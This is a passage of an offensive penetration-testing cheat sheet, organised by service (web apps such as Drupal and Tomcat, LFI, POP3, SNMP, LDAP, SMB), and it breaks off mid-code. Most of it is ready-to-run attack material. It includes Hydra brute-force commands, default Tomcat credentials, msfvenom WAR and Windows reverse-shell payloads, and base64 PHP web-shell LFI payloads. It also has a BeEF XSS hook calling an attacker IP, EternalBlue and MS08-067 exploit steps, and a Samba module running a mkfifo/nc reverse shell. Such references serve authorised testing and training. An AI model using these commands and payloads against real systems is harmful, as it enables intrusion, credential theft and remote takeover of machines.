If you request a new password for an existing username :
*Unable to send e-mail. Contact the site administrator if the problem persists.*

If you request a new password for a non-existent username :
*Sorry, test is not recognized as a user name or an e-mail address.*

Accessing /user/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>number</span><span class="token punctuation">></span></span> you can see the number of existing users :
    - /user/1 -> Access denied (user exist)
    - /user/2 -> Page not found (user doesn't exist)</code></pre><h4 id=hidden-pages-enumeration>Hidden pages enumeration</h4> <pre class=language-><code class=language->Fuzz /node/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>NUMBER</span><span class="token punctuation">></span></span> where <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>NUMBER</span><span class="token punctuation">></span></span> is a number (from 1 to 500 for example).
You could find hidden pages (test, dev) which are not referenced by the search engines.

wfuzz -c -z range,1-500 --hc 404 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>/node/FUZZ</code></pre><h4 id=drupal-panel-rce>Drupal panel RCE</h4> <pre class=language-><code class=language->You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)

Go to Modules -> (Check) PHP Filter  -> Save configuration

https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

Then click on Add content -> Select Basic Page or Article -> Write php shellcode on the body -> Select PHP code in Text format -> Select Preview</code></pre><h3 id=joomla>Joomla</h3> <pre class=language-><code class=language->joomscan -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>
./joomlavs.rb --url <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span> -a -v</code></pre><h3 id=tomcat>Tomcat</h3> <h4 id=default-credentials>Default credentials</h4> <pre class=language-><code class=language->The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :

admin:admin
tomcat:tomcat
admin:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>NOTHING</span><span class="token punctuation">></span></span>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat</code></pre><h4 id=brute-force-2>Brute force</h4> <pre class=language-><code class=language->hydra -L <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERS_LIST</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> -f <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> http-get /manager/html -vV -u</code></pre><h4 id=tomcat-panel-rce>Tomcat panel RCE</h4> <pre class=language-><code class=language-># Generate payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f war > shell.war

# Upload payload
Tomcat6 :
wget 'http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>:8080/manager/deploy?war=file:shell.war&path=/shell' -O -

Tomcat7 and above :
curl -v -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span> -T shell.war 'http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>:8080/manager/text/deploy?path=/shellh&update=true'

# Listener
nc -lvp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span>

# Execute payload
curl http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>:8080/shell/</code></pre><h3 id=webdav>WebDav</h3> <pre class=language-><code class=language->davtest -url <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span></code></pre><h3 id=http-brute-force-authentication>HTTP brute force authentication</h3> <h4 id=http-basic-authentication>HTTP basic authentication</h4> <pre class=language-><code class=language-># Hydra
hydra -l <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> -V -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> -s 80 -f <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> http-get /<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL_ENDPOINT</span><span class="token punctuation">></span></span>/ -t 15

# Patator
python patator.py http_fuzz auth_type=basic url=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span> user_pass=FILE0 0=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">USER:</span>PASSWORD_LIST</span><span class="token punctuation">></span></span> -x ignore:code=401 -x ignore:code=307</code></pre><h4 id=http-get-request>HTTP GET request</h4> <pre class=language-><code class=language->hydra <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -V -l <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>THREADS_NUMBER</span><span class="token punctuation">></span></span></code></pre><h4 id=http-post-request>HTTP POST request</h4> <pre class=language-><code class=language->hydra -l <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>THREADS_NUMBER</span><span class="token punctuation">></span></span></code></pre><h3 id=spidering--brute-force-directories--files>Spidering / Brute force directories / files</h3> <pre class=language-><code class=language->gospider -d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DEPTHS</span><span class="token punctuation">></span></span> --robots --sitemap -t <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>THREADS</span><span class="token punctuation">></span></span> -s <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>

ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>/FUZZ -e .php,.txt -t <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>THREADS</span><span class="token punctuation">></span></span>
dirbuster

Dictionaries :
   - /usr/share/wordlists/dirb/common.txt
   - /usr/share/wordlists/dirb/big.txt
   - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></pre><h4 id=file-backups>File backups</h4> <p>Once you have found all the files, look for backups of all the executable files ("<em>.php</em>", "<em>.aspx</em>"...). Common variations for naming a backup are </p> <pre class=language-><code class=language->file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old</code></pre><h3 id=local-file-inclusion--remote-file-inclusion---lfi--rfi>Local File Inclusion / Remote File Inclusion - LFI / RFI</h3> <pre class=language-><code class=language->https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion</code></pre><h4 id=wrappers>Wrappers</h4> <h5 id=wrapper-phpfilter>Wrapper php://filter</h5> <pre class=language-><code class=language->http://example.com/index.php?page=php://filter/convert.base64-encode/resource=</code></pre><h5 id=wrapper-expect>Wrapper expect://</h5> <pre class=language-><code class=language->http://example.com/index.php?page=expect://id</code></pre><h5 id=wrapper-data>Wrapper data://</h5> <pre class=language-><code class=language->echo '<span class="token prolog">&lt;?php phpinfo(); ?></span>' | base64 -w0 -> PD9waHAgcGhwaW5mbygpOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=

If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.

Code execution with 
    - exec
    - shell_exec
    - system
    - passthru
    - popen

# Exemple
echo '<span class="token prolog">&lt;?php passthru($_GET["cmd"]);echo "Shell done !"; ?></span>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

If there is "Shell done !" on the webpage, then there is code execution and you can do things like :

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&cmd=ls</code></pre><h5 id=wrapper-input>Wrapper input://</h5> <pre class=language-><code class=language->curl -k -v "http://example.com/index.php?page=php://input" --data "<span class="token prolog">&lt;?php echo shell_exec('id'); ?></span>"</code></pre><h4 id=useful-lfi-list>Useful LFI list</h4> <pre class=language-><code class=language-># Linux
/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt

# Windows
/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

# Both
/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</code></pre><h4 id=tools>Tools</h4> <pre class=language-><code class=language->kadimus --url <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>
python lfisuite.py</code></pre><h3 id=command-injection>Command injection</h3> <p>For command injection always use BurpSuite !</p> <pre class=language-><code class=language->https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</code></pre><h3 id=deserialization>Deserialization</h3> <pre class=language-><code class=language->https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization</code></pre><h3 id=file-upload>File upload</h3> <pre class=language-><code class=language->https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files</code></pre><h3 id=sql-injection>SQL injection</h3> <pre class=language-><code class=language->https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli</code></pre><h3 id=xss>XSS</h3> <pre class=language-><code class=language->https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

beef-xss
cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://&lt;IP>:3000/hook.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h3 id=other-web-vulnerabilities>Other web vulnerabilities</h3> <pre class=language-><code class=language->https://github.com/swisskyrepo/PayloadsAllTheThings</code></pre><h3 id=upload-a-file-with-put>Upload a file with PUT</h3> <pre class=language-><code class=language->curl -X PUT http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE</span><span class="token punctuation">></span></span> -d @<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE</span><span class="token punctuation">></span></span>  -v</code></pre><hr> <h2 id=kerberos---88>KERBEROS - 88</h2> <pre class=language-><code class=language->https://www.tarlogic.com/en/blog/how-to-attack-kerberos/</code></pre><hr> <h2 id=pop3---110>POP3 - 110</h2> <h3 id=brute-force-3>Brute force</h3> <pre class=language-><code class=language->hydra -l <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> -f <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> pop3 -V
hydra -S -v -l <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> -s 995 -f <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> pop3 -V</code></pre><h3 id=read-mail>Read mail</h3> <pre class=language-><code class=language->telnet <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> 110

USER <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>
PASS <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span>
LIST
RETR <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MAIL_NUMBER</span><span class="token punctuation">></span></span>
QUIT</code></pre><hr> <h2 id=snmp---161>SNMP - 161</h2> <h3 id=brute-force-community-string>Brute force community string</h3> <pre class=language-><code class=language->onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span></code></pre><pre class=language-><code class=language->snmpbulkwalk -c <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>COMMUNITY_STRING</span><span class="token punctuation">></span></span> -v<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>VERSION</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span></code></pre><pre class=language-><code class=language->snmp-check <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span></code></pre><h3 id=modifying-snmp-values>Modifying SNMP values</h3> <pre class=language-><code class=language->http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html</code></pre><hr> <h2 id=ldap---389>LDAP - 389</h2> <h3 id=scans>Scans</h3> <pre class=language-><code class=language->nmap -n -sV --script "ldap* and not brute"

ldapsearch -h <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -x -s base
ldapsearch -h <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -x -D '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span>\<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>' -w '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span>' -b "DC=&lt;1_SUBDOMAIN>,DC=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TDL</span><span class="token punctuation">></span></span>"</code></pre><h3 id=graphical-interface>Graphical Interface</h3> <pre class=language-><code class=language->jxplorer</code></pre><hr> <h2 id=smb---445>SMB - 445</h2> <h3 id=version-if-nmap-didnt-detect-it>Version if nmap didn't detect it</h3> <pre class=language-><code class=language->Sometimes nmap doesnt show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.

OR

sudo ngrep -i -d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>INTERFACE</span><span class="token punctuation">></span></span> 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -L <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span></code></pre><h3 id=scan-for-vulnerability>Scan for vulnerability</h3> <pre class=language-><code class=language->nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span></code></pre><p>If :</p> <ul> <li>MS17-010 - <a href=javascript:; onclick="document.location.hash='EternalBlue';" title=MS17-010>EternalBlue</a></li> <li>MS08-067 - <a href=javascript:; onclick="document.location.hash='MS08-067';">MS08-067</a></li> <li>CVE-2017-7494 - <a href=javascript:; onclick="document.location.hash='CVE-2017-7494';">CVE-2017-7494</a></li> </ul> <h3 id=manual-testing>Manual testing</h3> <pre class=language-><code class=language->smbmap -H <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
smbmap -u '' -p '' -H <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
smbmap -u 'guest' -p '' -H <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
smbmap -u '' -p '' -H <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -R

crackmapexec smb <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
crackmapexec smb <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -u '' -p ''
crackmapexec smb <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -u 'guest' -p ''
crackmapexec smb <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -u '' -p '' --shares

enum4linux -a <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>

smbclient --no-pass -L //$IP
smbclient //<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SHARE</span><span class="token punctuation">></span></span>

# Download all files from a directory recursively
smbclient //<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SHARE</span><span class="token punctuation">></span></span> -U <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> -c "prompt OFF;recurse ON;mget *"</code></pre><h3 id=brute-force-4>Brute force</h3> <pre class=language-><code class=language->crackmapexec smb <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERS_LIST</span><span class="token punctuation">></span></span> -p <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span>
hydra -V -f -L <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERS_LIST</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> smb://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -u -vV</code></pre><h3 id=mount-a-smb-share>Mount a SMB share</h3> <pre class=language-><code class=language->mkdir /tmp/share
sudo mount -t cifs //<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SHARE</span><span class="token punctuation">></span></span> /tmp/share
sudo mount -t cifs -o 'username=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>,password=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span>'//<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SHARE</span><span class="token punctuation">></span></span> /tmp/share

smbclient //<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SHARE</span><span class="token punctuation">></span></span>
smbclient //<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SHARE</span><span class="token punctuation">></span></span> -U <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span></code></pre><h3 id=get-a-shell>Get a shell</h3> <pre class=language-><code class=language->psexec.py <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
psexec.py <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -hashes :<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>NTHASH</span><span class="token punctuation">></span></span>

wmiexec.py <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
wmiexec.py <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -hashes :<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>NTHASH</span><span class="token punctuation">></span></span>

smbexec.py <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
smbexec.py <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -hashes :<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>NTHASH</span><span class="token punctuation">></span></span>

atexec.py <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>COMMAND</span><span class="token punctuation">></span></span>
atexec.py <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -hashes :<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>NTHASH</span><span class="token punctuation">></span></span></code></pre><h3 id=eternalblue-ms17-010>EternalBlue (MS17-010)</h3> <pre class=language-><code class=language->https://github.com/3ndG4me/AutoBlue-MS17-010</code></pre><h4 id=check-if-vulnerable>Check if vulnerable</h4> <pre class=language-><code class=language->python eternal_checker.py <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span></code></pre><h4 id=prepare-shellcodes-and-listeners>Prepare shellcodes and listeners</h4> <pre class=language-><code class=language->cd shellcode
./shell_prep.sh
cd ..
./listener_prep.sh</code></pre><h4 id=exploit>Exploit</h4> <pre class=language-><code class=language->python eternalblue_exploit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>NUMBER</span><span class="token punctuation">></span></span>.py <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> shellcode/sc_all.bin

May need to run it multiple times</code></pre><h4 id=if-this-doesnt-work-try-this-one>If this doesn't work, try this one</h4> <pre class=language-><code class=language->python zzz_exploit.py <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span></code></pre><h3 id=ms08-067>MS08-067</h3> <pre class=language-><code class=language-># Download exploit code
git clone https://github.com/andyacer/ms08_067.git

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
msfvenom -p windows/shell_bind_tcp RHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

# Modify
Modify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.

# Listener
nc -lvp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span>

# Exploit
python ms08_067_2018.py <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>NUMBER</span><span class="token punctuation">></span></span> 445</code></pre><h3 id=cve-2017-7494>CVE-2017-7494</h3> <pre class=language-><code class=language-># Download exploit code
git clone https://github.com/joxeankoret/CVE-2017-7494</code></pre><p>Create a new file named poc.c :</p> <pre class=language-><code class=language->#include <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stdio.h</span><span class="token punctuation">></span></span>
#include <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stdlib.h</span><span class="token punctuation">></span></span>

int samba_init_module(void)
{
    setresuid(0,0,0);
    system("ping -c 3 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>");
}</code></pre><pre class=language-><code class=language-># Build
gcc -o test.so -shared poc.c -fPIC</code></pre><pre class=language-><code class=language-># Start an ICMP listener
sudo tcpdump -i <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>INTERFACE</span><span class="token punctuation">></span></span> icmp

# Exploit
./cve_2017_7494.py -t <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TARGET_IP</span><span class="token punctuation">></span></span> -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span> --custom=test.so</code></pre><p>If you reiceve 3 pings on your listener then the exploit works. Now let's get a shell :</p> <pre class=language-><code class=language->#include <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stdio.h</span><span class="token punctuation">></span></span>
#include <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stdlib.h</span><span class="token punctuation">></span></span>

int samba_init_module(void)
{
    setresuid(0,0,0);
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> >/tmp/f");
